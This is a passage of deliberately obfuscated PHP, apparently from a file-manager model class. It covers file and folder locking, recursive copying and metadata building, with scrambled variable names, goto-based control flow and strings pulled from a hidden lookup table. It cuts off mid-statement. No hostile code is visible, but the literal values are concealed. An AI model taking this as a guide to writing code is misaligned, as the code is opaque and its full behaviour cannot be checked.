$C¡Ö‘‹´Æ =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $E×¤Œàê£Œ = 0; $this->_lockEvent($FÁ‡ˆô‹Öé, array($C¡Ö‘‹´Æ[527], $C¡Ö‘‹´Æ[528]), $E×¤Œàê£Œ); $this->_lockParent($FÁ‡ˆô‹Öé, array($C¡Ö‘‹´Æ[528]), $E×¤Œàê£Œ); $this->_lockEvent($FÁ‡ˆô‹Öé, array($C¡Ö‘‹´Æ[529], $C¡Ö‘‹´Æ[530]), $E×¤Œàê£Œ); } public function lockWriteStart($Cô¯ÉÌ’Â, $EšÁŒÎÅ˜ = '') { goto c«ĞÛÓ¿Ë¼; D¨ó™šñ : $this->_lockParent($Cô¯ÉÌ’Â, array($A¨Øº¨óÅë[526], $A¨Øº¨óÅë[528]), $B¼éÓğÊêì); $this->_lockCheckEnd($A¨Øº¨óÅë[527], $Cô¯ÉÌ’Â); goto EŠª¬÷Í¶Ñ; aİ…Ù¿ÉÁÁ: $B¼éÓğÊêì = 1; $this->_lockKey($A¨Øº¨óÅë[531] . $Cô¯ÉÌ’Â . $A¨Øº¨óÅë[105] . $EšÁŒÎÅ˜, $B¼éÓğÊêì); $this->_lockEvent($Cô¯ÉÌ’Â, array($A¨Øº¨óÅë[526], $A¨Øº¨óÅë[528]), $B¼éÓğÊêì); goto D¨ó™šñ ; c«ĞÛÓ¿Ë¼: $A¨Øº¨óÅë =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($A¨Øº¨óÅë[527], $Cô¯ÉÌ’Â); goto aİ…Ù¿ÉÁÁ; EŠª¬÷Í¶Ñ: } public function lockWriteEnd($eÎŸÃ‡İŠ³, $c÷åÅ‰ï’æ = '') { $c¬ºø¯Øğ =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $fÍËµ©‹¹ = 0; $this->_lockKey($c¬ºø¯Øğ[531] . $eÎŸÃ‡İŠ³ . $c¬ºø¯Øğ[105] . $c÷åÅ‰ï’æ, $fÍËµ©‹¹); $this->_lockEvent($eÎŸÃ‡İŠ³, array($c¬ºø¯Øğ[526], $c¬ºø¯Øğ[528]), $fÍËµ©‹¹); $this->_lockParent($eÎŸÃ‡İŠ³, array($c¬ºø¯Øğ[526], $c¬ºø¯Øğ[528]), $fÍËµ©‹¹); } public function lockMoveStart($aèŒ©Ø¤Ğ·) { goto b«ß¦ÛÍ¼Õ; EÙ·ëº£ŒÓ: $dÜ¾«Ş‰ÏÚ = 1; $this->_lockKey($AŞ‚Á¥ÔÌ˜[532] . $aèŒ©Ø¤Ğ·, $dÜ¾«Ş‰ÏÚ); $this->_lockEvent($aèŒ©Ø¤Ğ·, array($AŞ‚Á¥ÔÌ˜[526], $AŞ‚Á¥ÔÌ˜[527]), $dÜ¾«Ş‰ÏÚ); goto D„Á­Ì×ÉÉ; b«ß¦ÛÍ¼Õ: $AŞ‚Á¥ÔÌ˜ =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $this->_lockCheck($AŞ‚Á¥ÔÌ˜[528], $aèŒ©Ø¤Ğ·); goto EÙ·ëº£ŒÓ; D„Á­Ì×ÉÉ: $this->_lockParent($aèŒ©Ø¤Ğ·, array($AŞ‚Á¥ÔÌ˜[526], $AŞ‚Á¥ÔÌ˜[528]), $dÜ¾«Ş‰ÏÚ); $this->_lockEvent($aèŒ©Ø¤Ğ·, array($AŞ‚Á¥ÔÌ˜[533], $AŞ‚Á¥ÔÌ˜[529], $AŞ‚Á¥ÔÌ˜[530]), $dÜ¾«Ş‰ÏÚ); $this->_lockCheckEnd($AŞ‚Á¥ÔÌ˜[528], $aèŒ©Ø¤Ğ·); goto Eô®¦àÕ‚´; Eô®¦àÕ‚´: } public function lockMoveEnd($c‹Æ²ñ›Ä†) { goto DİÎ¹¬±ôÓ; FëÁõ¢Â†: $this->_lockEvent($c‹Æ²ñ›Ä†, array($fÀ¤ñ„ïÉ­[533], $fÀ¤ñ„ïÉ­[529], $fÀ¤ñ„ïÉ­[530]), $e½‹¸Å›Âî); goto A³‘Ş‰ì±÷; DİÎ¹¬±ôÓ: $fÀ¤ñ„ïÉ­ =& $_SERVER[£¶ä½¶¢]; if (!$this->allowLock()) { return; } $e½‹¸Å›Âî = 0; goto c®‹Âá´; c®‹Âá´: $this->_lockKey($fÀ¤ñ„ïÉ­[532] . $c‹Æ²ñ›Ä†, $e½‹¸Å›Âî); $this->_lockEvent($c‹Æ²ñ›Ä†, array($fÀ¤ñ„ïÉ­[526], $fÀ¤ñ„ïÉ­[527]), $e½‹¸Å›Âî); $this->_lockParent($c‹Æ²ñ›Ä†, array($fÀ¤ñ„ïÉ­[526], $fÀ¤ñ„ïÉ­[528]), $e½‹¸Å›Âî); goto FëÁõ¢Â†; A³‘Ş‰ì±÷: } private function _lockCheck($EˆŸÑÚ‹•, $b…µÖŞí‹) { goto a÷©†øŞÊ ; B†´„§æ ƒ: CacheLock::setErrorMsg($bÍİÑÇáå[170] . htmlspecialchars($eÎÒßÏõñˆ[$bÍİÑÇáå[38]]) . $bÍİÑÇáå[512] . $C×°‡øßÖ‡); $this->_lockKey($fÜÀÎµ‘Æ, 1); $this->_lockKey($fÜÀÎµ‘Æ, 0); goto cÔ„óñÃƒ; cÔ„óñÃƒ: $A£¼ğˆŒ¦Ó = array_reverse($this->parentLevelArray($eÎÒßÏõñˆ[$bÍİÑÇáå[495]])); foreach ($A£¼ğˆŒ¦Ó as $b¨ÕëÜ¯ÊÉ) { $fÜÀÎµ‘Æ = $EˆŸÑÚ‹• . $bÍİÑÇáå[535] . $b¨ÕëÜ¯ÊÉ; if (CacheLock::lockGet($bÍİÑÇáå[536] . $fÜÀÎµ‘Æ)) { $eÎÒßÏõñˆ = $this->sourceInfo($b¨ÕëÜ¯ÊÉ); CacheLock::setErrorMsg($bÍİÑÇáå[170] . htmlspecialchars($eÎÒßÏõñˆ[$bÍİÑÇáå[38]]) . $bÍİÑÇáå[512] . $C×°‡øßÖ‡); $this->_lockKey($fÜÀÎµ‘Æ, 1); $this->_lockKey($fÜÀÎµ‘Æ, 0); } } goto F‚Ñ¶ˆˆî; a÷©†øŞÊ : $bÍİÑÇáå =& $_SERVER[£¶ä½¶¢]; $eÎÒßÏõñˆ = $this->sourceInfo($b…µÖŞí‹); $fÜÀÎµ‘Æ = $EˆŸÑÚ‹• . $bÍİÑÇáå[105] . $b…µÖŞí‹; goto DÉĞç±Ì‰; DÉĞç±Ì‰: $this->_lockTimeStart[$fÜÀÎµ‘Æ] = timeFloat(); if (!is_array($eÎÒßÏõñˆ)) { return; } $C×°‡øßÖ‡ = LNG($bÍİÑÇáå[534]); goto B†´„§æ ƒ; F‚Ñ¶ˆˆî: } private function _lockCheckEnd($DË™§£ñ‚µ, $B²°‹œ³¡) { goto dÜÌ·Ç‡˜; aÃŞ‚ñÑ‘Š: if ($bÉïˆ¤‹º… > 0.5) { unset(self::$cacheSourceInfo[$d†©Ì±©æŞ[446] . $B²°‹œ³¡]); } $dŒá¼Óöë = $this->sourceInfo($B²°‹œ³¡); if (!$dŒá¼Óöë) { show_json(LNG($d†©Ì±©æŞ[115]), !1); } goto fÂÖ¹—„Ïç; d—ÌöË½ªÅ: if (!isset($this->_lockTimeStart[$e‚ÄÃº–])) { return; } $bÉïˆ¤‹º… = timeFloat() - $this->_lockTimeStart[$e‚ÄÃº–]; unset($this->_lockTimeStart[$e‚ÄÃº–]); goto aÃŞ‚ñÑ‘Š; dÜÌ·Ç‡˜: $d†©Ì±©æŞ =& $_SERVER[£¶ä½¶¢]; $e‚ÄÃº– = $DË™§£ñ‚µ . $d†©Ì±©æŞ[105] . $B²°‹œ³¡; CacheLock::setErrorMsg($d†©Ì±©æŞ[13]); goto d—ÌöË½ªÅ; fÂÖ¹—„Ïç: } private function _lockParent($dß­‡ÜœÜ¨, $A»î’´¥Şß, $Dšäñò‹áÆ) { if (!$this->autoLockSet) { return; } $EÆõ²©¼ÛÍ = $this->sourceInfo($dß­‡ÜœÜ¨); if (!is_array($EÆõ²©¼ÛÍ)) { return; } $FØÎ“ÅŞ‹® = array_reverse($this->parentLevelArray($EÆõ²©¼ÛÍ[$_SERVER[£¶ä½¶¢][495]])); foreach ($FØÎ“ÅŞ‹® as $b©³œŒ¯ƒ) { $this->_lockEvent($b©³œŒ¯ƒ, $A»î’´¥Şß, $Dšäñò‹áÆ); } } private function _lockEvent($DÜö¤­ÂÛ¿, $b¦²„Àä°…, $d¶„ÓÎÁÎÒ) { $aÔ„Ä“Å¬½ =& $_SERVER[£¶ä½¶¢]; if (!$this->autoLockSet) { return; } foreach ($b¦²„Àä°… as $B¹¡¶¥èé‡) { $CÎò‹®ãéª = $B¹¡¶¥èé‡ . $aÔ„Ä“Å¬½[105] . $DÜö¤­ÂÛ¿; if ($d¶„ÓÎÁÎÒ && CacheLock::lockGet($aÔ„Ä“Å¬½[536] . $CÎò‹®ãéª)) { continue; } $this->_lockKey($CÎò‹®ãéª, $d¶„ÓÎÁÎÒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dÌßŠùõ°, $D•‰¨òœ½ë = 1) { $b„ä –À¢© = $_SERVER[£¶ä½¶¢][536] . md5($dÌßŠùõ°); if ($D•‰¨òœ½ë) { if (isset(self::$_lockItemArr[$b„ä –À¢©])) { return; } self::$_lockItemArr[$b„ä –À¢©] = 1; CacheLock::lock($b„ä –À¢©, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$b„ä –À¢©])) { return; } unset(self::$_lockItemArr[$b„ä –À¢©]); CacheLock::unlock($b„ä –À¢©); } } public function isParentOf($b¡ªóë¹÷Ó, $b×ôÑ±¶Š) { goto a“¸”·ì¡; aÜØ§Ò †Ø: $fß–Ï†Â¦š = $a”»Ö›Ü»[$bâò÷ªòÆ‘[495]] . $a”»Ö›Ü»[$bâò÷ªòÆ‘[403]] . $bâò÷ªòÆ‘[57]; $dáğŒ…áÓ” = $E–ä­Ì÷“Ú[$bâò÷ªòÆ‘[495]] . $E–ä­Ì÷“Ú[$bâò÷ªòÆ‘[403]] . $bâò÷ªòÆ‘[57]; $Eê¦˜³ôÑÌ = strpos($dáğŒ…áÓ”, $fß–Ï†Â¦š) === 0; goto dÅÈÉè‡ÆÏ; dÅÈÉè‡ÆÏ: return $Eê¦˜³ôÑÌ; goto aÎãÍšæ; a“¸”·ì¡: $bâò÷ªòÆ‘ =& $_SERVER[£¶ä½¶¢]; $a”»Ö›Ü» = $this->sourceInfo($b¡ªóë¹÷Ó); $E–ä­Ì÷“Ú = $this->sourceInfo($b×ôÑ±¶Š); goto aÜØ§Ò †Ø; aÎãÍšæ: } private $targetIsDelete = 0; public function copy($D‰˜‹Šô‘¢, $B—¹öÉôËÈ, $e ŠòÆŒƒó = REPEAT_REPLACE, $F£‡ÉŒ‡·ì = '') { goto BìÄÉ§ÉÑœ; cÜöéŒß’Æ: $this->lockCopyStart($D‰˜‹Šô‘¢); $this->lockWriteStart($B—¹öÉôËÈ, $DŒœ„†äÇµ); $Cé…äªŒ…ò = array($BÑöãë·Ô¯[537] => array(), $BÑöãë·Ô¯[538] => array(), $BÑöãë·Ô¯[539] => array()); goto eô‡êÃˆ°; eô‡êÃˆ°: $this->targetIsDelete = intval($B¯Œº°‘²›[$BÑöãë·Ô¯[431]]); $E¾è¾øë‚ = $this->fileNameExistCache($B—¹öÉôËÈ, $B¯Œº°‘²›[$BÑöãë·Ô¯[38]]); $cÜŒòÔªÈ = $this->_copy($D‰˜‹Šô‘¢, $B—¹öÉôËÈ, $e ŠòÆŒƒó, $Cé…äªŒ…ò, !0, $F£‡ÉŒ‡·ì); goto B°Şëµ¹Ä¼; Dƒ×‰˜ˆ¨: $this->saveAll($Cé…äªŒ…ò[$BÑöãë·Ô¯[539]]); Model($BÑöãë·Ô¯[203])->linkAdd($Cé…äªŒ…ò[$BÑöãë·Ô¯[537]]); $this->folderSizeReset($B—¹öÉôËÈ); goto cŒéõóí‚Î; EõŸÃĞìë÷: if (!$B¯Œº°‘²› || !$aŞ¥´ßÍßî || $aŞ¥´ßÍßî[$BÑöãë·Ô¯[411]] != $BÑöãë·Ô¯[97]) { return !1; } if ($this->isParentOf($D‰˜‹Šô‘¢, $B—¹öÉôËÈ)) { return !1; } $DŒœ„†äÇµ = $F£‡ÉŒ‡·ì ? $F£‡ÉŒ‡·ì : $B¯Œº°‘²›[$BÑöãë·Ô¯[38]]; goto cÜöéŒß’Æ; BßÚŠ‚ÁÖ­: if ($B¯Œº°‘²›[$BÑöãë·Ô¯[411]] == $BÑöãë·Ô¯[97] && $E¾è¾øë‚ == $cÜŒòÔªÈ) { $this->folderSizeResetChildren($E¾è¾øë‚); } Model($BÑöãë·Ô¯[540])->addAll($Cé…äªŒ…ò[$BÑöãë·Ô¯[538]], array(), !0); if ($E¾è¾øë‚ != $cÜŒòÔªÈ || $B¯Œº°‘²›[$BÑöãë·Ô¯[411]] == $BÑöãë·Ô¯[97]) { Model($BÑöãë·Ô¯[541])->eventCopy($cÜŒòÔªÈ); } goto Dƒ×‰˜ˆ¨; BìÄÉ§ÉÑœ: $BÑöãë·Ô¯ =& $_SERVER[£¶ä½¶¢]; $B¯Œº°‘²› = $this->sourceInfo($D‰˜‹Šô‘¢); $aŞ¥´ßÍßî = $this->sourceInfo($B—¹öÉôËÈ); goto EõŸÃĞìë÷; B°Şëµ¹Ä¼: $this->_childrenListClear(); $this->lockCopyEnd($D‰˜‹Šô‘¢); $this->lockWriteEnd($B—¹öÉôËÈ, $DŒœ„†äÇµ); goto BßÚŠ‚ÁÖ­; cŒéõóí‚Î: $this->updateModifyTime($B—¹öÉôËÈ); return $cÜŒòÔªÈ; goto AÈãÅ‘ô„Â; AÈãÅ‘ô„Â: } private function _copy($CïŠ“ÂØ¶, $E„£ã¹›‡È, $fÊÎ¯ öòÓ, &$FĞÎçÀÅó, $B’Ãƒ´Ö£, $bŸÅ  á§Í = '') { goto A¶¹Ö¶ƒ£ñ; EÁˆÍÙ•: $Côœ¶œáë– = $bŸÅ  á§Í ? $bŸÅ  á§Í : $d©ƒ¯ïÂ–”[$E®À¸æÂšš[38]]; $bôˆĞŞÇ• = $this->fileNameExistCache($E„£ã¹›‡È, $Côœ¶œáë–); if ($B’Ãƒ´Ö£) { $this->_childrenAllMake($CïŠ“ÂØ¶); if ($föÓ„¿Ø’ && $bôˆĞŞÇ•) { $this->_childrenAllMake($bôˆĞŞÇ•); } } goto Bœ±ê¸óƒÎ; CçºÜÚ‘°¾: return $bë–§Š„; goto DßÍ÷½Ÿ¢; A¶¹Ö¶ƒ£ñ: $E®À¸æÂšš =& $_SERVER[£¶ä½¶¢]; $d©ƒ¯ïÂ–” = $this->sourceInfoCache($CïŠ“ÂØ¶); $föÓ„¿Ø’ = $d©ƒ¯ïÂ–”[$E®À¸æÂšš[411]] == $E®À¸æÂšš[97]; goto EÁˆÍÙ•; Bœ±ê¸óƒÎ: if (!$bôˆĞŞÇ•) { return $this->_copyCreate($CïŠ“ÂØ¶, $E„£ã¹›‡È, $Côœ¶œáë–, $FĞÎçÀÅó); } $bë–§Š„ = $bôˆĞŞÇ•; if ($föÓ„¿Ø’) { if ($fÊÎ¯ öòÓ == REPEAT_RENAME_FOLDER) { $Côœ¶œáë– = $this->fileNameAutoCache($E„£ã¹›‡È, $Côœ¶œáë–, $fÊÎ¯ öòÓ, $föÓ„¿Ø’); $bë–§Š„ = $this->_copyCreate($CïŠ“ÂØ¶, $E„£ã¹›‡È, $Côœ¶œáë–, $FĞÎçÀÅó); } else { $a´šãù†õ­ = $this->_childrenList($CïŠ“ÂØ¶); foreach ($a´šãù†õ­ as $d•è ”„‡Ó) { $this->_copy($d•è ”„‡Ó[$E®À¸æÂšš[403]], $bôˆĞŞÇ•, $fÊÎ¯ öòÓ, $FĞÎçÀÅó, !1); } } } else { if ($fÊÎ¯ öòÓ == REPEAT_RENAME || $fÊÎ¯ öòÓ == REPEAT_RENAME_FOLDER) { $Côœ¶œáë– = $this->fileNameAutoCache($E„£ã¹›‡È, $Côœ¶œáë–, $fÊÎ¯ öòÓ, $föÓ„¿Ø’); $bë–§Š„ = $this->_copyCreate($CïŠ“ÂØ¶, $E„£ã¹›‡È, $Côœ¶œáë–, $FĞÎçÀÅó); } else { if ($fÊÎ¯ öòÓ == REPEAT_REPLACE) { $bùºµºãø¶ = $this->sourceInfoCache($bôˆĞŞÇ•); $e„‹Ê·±†¥ = $this->fileHistory($bùºµºãø¶, $d©ƒ¯ïÂ–”[$E®À¸æÂšš[455]], $d©ƒ¯ïÂ–”[$E®À¸æÂšš[88]]); if ($e„‹Ê·±†¥) { $FĞÎçÀÅó[$E®À¸æÂšš[537]][] = $d©ƒ¯ïÂ–”[$E®À¸æÂšš[455]]; } } else { if ($fÊÎ¯ öòÓ == REPEAT_SKIP) { } } } Hook::trigger($E®À¸æÂšš[542], array($E®À¸æÂšš[543], $d©ƒ¯ïÂ–”, 0)); } goto CçºÜÚ‘°¾; DßÍ÷½Ÿ¢: } private function _copyCreate($bÇƒ¬¿’Á, $d ùœÊÌ´, $aÆ¾Ãâñ”, &$D×‰ƒâİ®) { goto cšÒ¤âÚ¢Ë; D ÏÃÛº¼Í: $dùÅ’ßà[$bÇƒ¬¿’Á] = $aÖùÇöß¦Ã; $d¥¾óˆ¦È¶ = array(); $AîÏ…çŠ¯ = array(); goto C…¦ÖÔâä®; Cˆ‰ŠÔ—‡—: $this->addAll($DöÈÜõó”Û, array(), !1); $eÆ÷ù„öä = $this->where(array($f¸‡¦ˆª‡­[486] => $aÖùÇöß¦Ã))->select(); $dùÅ’ßà = $this->_childrenMakeRelation($AÅ„†¿•Â¶, $eÆ÷ù„öä); goto D ÏÃÛº¼Í; cšÒ¤âÚ¢Ë: $f¸‡¦ˆª‡­ =& $_SERVER[£¶ä½¶¢]; $F¯ñŠáÃó— = $this->sourceInfoCache($bÇƒ¬¿’Á); $EäëØˆù«’ = $this->sourceInfoCache($d ùœÊÌ´); goto CŸ³¤‘îêß; AÂ¼›ŠÃÂ°: $bó‚šéÃÍÄ = $this->sourceInfo($aÖùÇöß¦Ã); foreach ($AÅ„†¿•Â¶ as $D¤ÁºÏ†¸) { $eğåã¨è¦ = $this->_makeItemData($D¤ÁºÏ†¸, $bó‚šéÃÍÄ, $D¤ÁºÏ†¸[$f¸‡¦ˆª‡­[38]]); $eğåã¨è¦[$f¸‡¦ˆª‡­[495]] = $D¤ÁºÏ†¸[$f¸‡¦ˆª‡­[495]]; $DöÈÜõó”Û[] = $eğåã¨è¦; } $this->chunkEventSet($f¸‡¦ˆª‡­[547], array($f¸‡¦ˆª‡­[548], $f‰Ş±Ã¹Ç, $E¡Óç¤’¨ñ)); goto Cˆ‰ŠÔ—‡—; CÌµœ”¦°¦: $this->_childrenListAll($bÇƒ¬¿’Á, $AÅ„†¿•Â¶); $E¡Óç¤’¨ñ = count($AÅ„†¿•Â¶); if ($E¡Óç¤’¨ñ == 0) { return $aÖùÇöß¦Ã; } goto AÂ¼›ŠÃÂ°; C…¦ÖÔâä®: foreach ($eÆ÷ù„öä as $D¤ÁºÏ†¸) { $E‘…éª¨îä = $D¤ÁºÏ†¸[$f¸‡¦ˆª‡­[403]]; $dÏŒ’Ö¾×‹ = $this->_childrenMatch($dùÅ’ßà, $D¤ÁºÏ†¸, $bó‚šéÃÍÄ); $d¥¾óˆ¦È¶[] = array($f¸‡¦ˆª‡­[403], $E‘…éª¨îä, $f¸‡¦ˆª‡­[486], $dÏŒ’Ö¾×‹[$f¸‡¦ˆª‡­[486]]); $AîÏ…çŠ¯[] = array($f¸‡¦ˆª‡­[403], $E‘…éª¨îä, $f¸‡¦ˆª‡­[495], $dÏŒ’Ö¾×‹[$f¸‡¦ˆª‡­[495]]); $this->_copyApplyMeta($D¤ÁºÏ†¸, $D×‰ƒâİ®); if ($D¤ÁºÏ†¸[$f¸‡¦ˆª‡­[411]] != $f¸‡¦ˆª‡­[97]) { $D×‰ƒâİ®[$f¸‡¦ˆª‡­[537]][] = $D¤ÁºÏ†¸[$f¸‡¦ˆª‡­[455]]; } } $this->chunkEventSet($f¸‡¦ˆª‡­[549], array($f¸‡¦ˆª‡­[550], $f‰Ş±Ã¹Ç, $E¡Óç¤’¨ñ)); $this->saveAll($d¥¾óˆ¦È¶); goto CïÉŒÂ †ƒ; E¸°›–Ë×“: if ($F¯ñŠáÃó—[$f¸‡¦ˆª‡­[411]] != $f¸‡¦ˆª‡­[97]) { $D×‰ƒâİ®[$f¸‡¦ˆª‡­[537]][] = $F¯ñŠáÃó—[$f¸‡¦ˆª‡­[455]]; return $aÖùÇöß¦Ã; } $AÅ„†¿•Â¶ = array(); $DöÈÜõó”Û = array(); goto CÌµœ”¦°¦; CŸ³¤‘îêß: $f‰Ş±Ã¹Ç = $this->_makeItemData($F¯ñŠáÃó—, $EäëØˆù«’, $aÆ¾Ãâñ”); Hook::trigger($f¸‡¦ˆª‡­[544], $f‰Ş±Ã¹Ç); Hook::trigger($f¸‡¦ˆª‡­[545], array($f¸‡¦ˆª‡­[546], $f‰Ş±Ã¹Ç, 0)); goto dŠìÄˆ¢Ø; dŠìÄˆ¢Ø: $aÖùÇöß¦Ã = $this->add($f‰Ş±Ã¹Ç); $eèœ”ß‘„ = array($f¸‡¦ˆª‡­[403] => $aÖùÇöß¦Ã, $f¸‡¦ˆª‡­[38] => $aÆ¾Ãâñ”); $this->_copyApplyMeta($eèœ”ß‘„, $D×‰ƒâİ®); goto E¸°›–Ë×“; CïÉŒÂ †ƒ: $this->chunkEventSet($f¸‡¦ˆª‡­[551], array($f¸‡¦ˆª‡­[552], $f‰Ş±Ã¹Ç, $E¡Óç¤’¨ñ)); $this->saveAll($AîÏ…çŠ¯); return $aÖùÇöß¦Ã; goto BïÂ†Ô¤; BïÂ†Ô¤: } private function _childrenMakeRelation($Bå†ÙšËÑ‘, $DåÂœ£…Ü¶) { $F·ºš®…îå =& $_SERVER[£¶ä½¶¢]; $e ‡ùŠ‡µ× = array(); $A÷Ó›Ëµ‹ = array(); foreach ($Bå†ÙšËÑ‘ as $BğÛñó‘Ş) { $Bà¼–¹±âÎ = $BğÛñó‘Ş[$F·ºš®…îå[38]] . $F·ºš®…îå[18] . $BğÛñó‘Ş[$F·ºš®…îå[495]]; $e ‡ùŠ‡µ×[$Bà¼–¹±âÎ] = $BğÛñó‘Ş[$F·ºš®…îå[403]]; } foreach ($DåÂœ£…Ü¶ as $BğÛñó‘Ş) { $Bà¼–¹±âÎ = $BğÛñó‘Ş[$F·ºš®…îå[38]] . $F·ºš®…îå[18] . $BğÛñó‘Ş[$F·ºš®…îå[495]]; $AÔ‘“Š„’ = $e ‡ùŠ‡µ×[$Bà¼–¹±âÎ]; $A÷Ó›Ëµ‹[$AÔ‘“Š„’] = $BğÛñó‘Ş[$F·ºš®…îå[403]]; } return $A÷Ó›Ëµ‹; } private function _childrenMatch($DØğë©‡½, $f‰òîæ’, $DÁÍÀØ˜¥ñ) { goto eÜ’·¬Èã; a‘ÛÓğÔÙà: foreach ($DÒ—¤Á¶ë as $Fñî‡¹ôØÕ) { if (isset($DØğë©‡½[$Fñî‡¹ôØÕ])) { $Fˆİ¢¸–ñÍ .= $DØğë©‡½[$Fñî‡¹ôØÕ] . $CõÌÅ°˜[553]; } } $Fˆİ¢¸–ñÍ = rtrim($Fˆİ¢¸–ñÍ, $CõÌÅ°˜[57]) . $CõÌÅ°˜[57]; $b––ìĞã„À = $this->parentLevelArray($Fˆİ¢¸–ñÍ); goto b³ôĞÀ˜ö ; b³ôĞÀ˜ö : $E·±ù¾ÒŒ¬ = $b––ìĞã„À[count($b––ìĞã„À) - 1]; return array($CõÌÅ°˜[486] => $E·±ù¾ÒŒ¬, $CõÌÅ°˜[495] => $Fˆİ¢¸–ñÍ); goto aˆš¯¸×†°; eÜ’·¬Èã: $CõÌÅ°˜ =& $_SERVER[£¶ä½¶¢]; $Fˆİ¢¸–ñÍ = $DÁÍÀØ˜¥ñ[$CõÌÅ°˜[495]]; $DÒ—¤Á¶ë = $this->parentLevelArray($f‰òîæ’[$CõÌÅ°˜[495]]); goto a‘ÛÓğÔÙà; aˆš¯¸×†°: } private function _makeItemData($cö‰÷ï—ØÃ, $fˆÆ‚”¨ê…, $aİö©çíïÄ) { $a¤‡¦îƒ¢¤ =& $_SERVER[£¶ä½¶¢]; $fÅãØÎ²Ş = array($a¤‡¦îƒ¢¤[554] => $cö‰÷ï—ØÃ[$a¤‡¦îƒ¢¤[411]], $a¤‡¦îƒ¢¤[421] => $aİö©çíïÄ, $a¤‡¦îƒ¢¤[555] => $cö‰÷ï—ØÃ[$a¤‡¦îƒ¢¤[413]], $a¤‡¦îƒ¢¤[456] => $cö‰÷ï—ØÃ[$a¤‡¦îƒ¢¤[455]], $a¤‡¦îƒ¢¤[556] => $cö‰÷ï—ØÃ[$a¤‡¦îƒ¢¤[88]], $a¤‡¦îƒ¢¤[557] => $fˆÆ‚”¨ê…[$a¤‡¦îƒ¢¤[412]], $a¤‡¦îƒ¢¤[558] => $fˆÆ‚”¨ê…[$a¤‡¦îƒ¢¤[492]], $a¤‡¦îƒ¢¤[559] => USER_ID, $a¤‡¦îƒ¢¤[560] => USER_ID, $a¤‡¦îƒ¢¤[402] => $fˆÆ‚”¨ê…[$a¤‡¦îƒ¢¤[403]], $a¤‡¦îƒ¢¤[561] => $fˆÆ‚”¨ê…[$a¤‡¦îƒ¢¤[495]] . $fˆÆ‚”¨ê…[$a¤‡¦îƒ¢¤[403]] . $a¤‡¦îƒ¢¤[57], $a¤‡¦îƒ¢¤[425] => $cö‰÷ï—ØÃ[$a¤‡¦îƒ¢¤[94]], $a¤‡¦îƒ¢¤[430] => 0, $a¤‡¦îƒ¢¤[562] => $a¤‡¦îƒ¢¤[43]); return $fÅãØÎ²Ş; } private function _copyApplyMeta($c«Âù’Ø•œ, &$aàÒ£¿½£ƒ) { $DŸÏ¨¿¬²ö =& $_SERVER[£¶ä½¶¢]; $eš¥“™¯¨ä = $c«Âù’Ø•œ[$DŸÏ¨¿¬²ö[403]]; $eß»ìÁ˜† = $c«Âù’Ø•œ[$DŸÏ¨¿¬²ö[38]]; if (!isset($c«Âù’Ø•œ[$DŸÏ¨¿¬²ö[563]]) || !$c«Âù’Ø•œ[$DŸÏ¨¿¬²ö[563]] || $c«Âù’Ø•œ[$DŸÏ¨¿¬²ö[563]] == $DŸÏ¨¿¬²ö[201]) { $aàÒ£¿½£ƒ[$DŸÏ¨¿¬²ö[539]][] = array($DŸÏ¨¿¬²ö[403], $eš¥“™¯¨ä, $DŸÏ¨¿¬²ö[563], short_id($eš¥“™¯¨ä)); } if (Input::check($eß»ìÁ˜†, $DŸÏ¨¿¬²ö[564])) { $aàÒ£¿½£ƒ[$DŸÏ¨¿¬²ö[538]][] = array($DŸÏ¨¿¬²ö[403] => $eš¥“™¯¨ä, $DŸÏ¨¿¬²ö[103] => $DŸÏ¨¿¬²ö[452], $DŸÏ¨¿¬²ö[381] => str_replace($DŸÏ¨¿¬²ö[60], $DŸÏ¨¿¬²ö[43], Pinyin::encode($eß»ìÁ˜†))); $aàÒ£¿½£ƒ[$DŸÏ¨¿¬²ö[538]][] = array($DŸÏ¨¿¬²ö[403] => $eš¥“™¯¨ä, $DŸÏ¨¿¬²ö[103] => $DŸÏ¨¿¬²ö[451], $DŸÏ¨¿¬²ö[381] => Pinyin::encode($eß»ìÁ˜†, $DŸÏ¨¿¬²ö[565])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A»ğğÖ‹§¿) { goto eö¢Û‚†¢; eö¢Û‚†¢: $c¯èİ¥ÎÈ… =& $_SERVER[£¶ä½¶¢]; $D®Èî… = $this->sourceInfo($A»ğğÖ‹§¿); $Fä‘‚—õÕÌ = $c¯èİ¥ÎÈ…[432]; goto E©ï“£ø¹…; C‡Ì‹ñ©â: $F¶“ƒğ˜äõ = array_to_keyvalue($F¶“ƒğ˜äõ, $c¯èİ¥ÎÈ…[403]); foreach ($F¶“ƒğ˜äõ as $f®“Î‡“İ§) { $a­Õ’ÈÄ = $f®“Î‡“İ§[$c¯èİ¥ÎÈ…[486]]; $A»ğğÖ‹§¿ = $f®“Î‡“İ§[$c¯èİ¥ÎÈ…[403]]; if (!isset($this->_childrenListCache[$A»ğğÖ‹§¿]) && $f®“Î‡“İ§[$c¯èİ¥ÎÈ…[411]] == $c¯èİ¥ÎÈ…[97]) { $this->_childrenListCache[$A»ğğÖ‹§¿] = array(); } if (!isset($this->_childrenListCache[$a­Õ’ÈÄ])) { $this->_childrenListCache[$a­Õ’ÈÄ] = array(); } $this->_childrenListCache[$a­Õ’ÈÄ][$A»ğğÖ‹§¿] = $f®“Î‡“İ§; $this->_childrenItemCache[$A»ğğÖ‹§¿] = $f®“Î‡“İ§; } goto aİø±¼’; E©ï“£ø¹…: $f‚Ó¾Ò¬… = array($c¯èİ¥ÎÈ…[495] => array($c¯èİ¥ÎÈ…[520], $D®Èî…[$c¯èİ¥ÎÈ…[495]] . $A»ğğÖ‹§¿ . $c¯èİ¥ÎÈ…[521]), $c¯èİ¥ÎÈ…[431] => $this->targetIsDelete); $F¶“ƒğ˜äõ = $this->field($Fä‘‚—õÕÌ)->where($f‚Ó¾Ò¬…)->select(); if (!$F¶“ƒğ˜äõ) { return; } goto C‡Ì‹ñ©â; aİø±¼’: } private function _childrenListAll($BŸÌêØÌ½Æ, &$c©‹øĞÙÃ) { $B–Ïñ›œÍ =& $_SERVER[£¶ä½¶¢]; if (!isset($this->_childrenListCache[$BŸÌêØÌ½Æ])) { return; } $Aè¤²ĞÎ’ = 